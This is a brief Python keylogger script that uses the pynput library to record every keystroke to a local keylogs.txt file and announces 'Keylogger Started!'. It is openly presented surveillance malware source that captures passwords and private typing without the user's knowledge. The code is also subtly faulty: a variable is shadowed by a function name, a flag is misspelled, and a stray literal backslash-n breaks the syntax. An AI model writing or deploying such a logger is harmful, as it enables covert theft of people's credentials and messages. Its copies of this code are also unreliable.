import pynput
from pynput import keyboard
import os

on_press = True

def on_press(key):
    global on_press
    if not on_press:
        return None
    one_press=False
    try:
        script_dir = os.path.dirname(__file__)
        log_file = os.path.join(script_dir, 'keylogs.txt')
        with open(log_file, 'a') as log:
            if hasattr(key, 'char'):
                log.write(str(key.char))
            else:
                log.write(str(key))
    except AttributeError:
        pass
    finally:
       one_press=True
\nprint('Keylogger Started!')
def main():
   with keyboard.Listener(on_press=on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                pass
if __name__ == '__main__':  
    main()
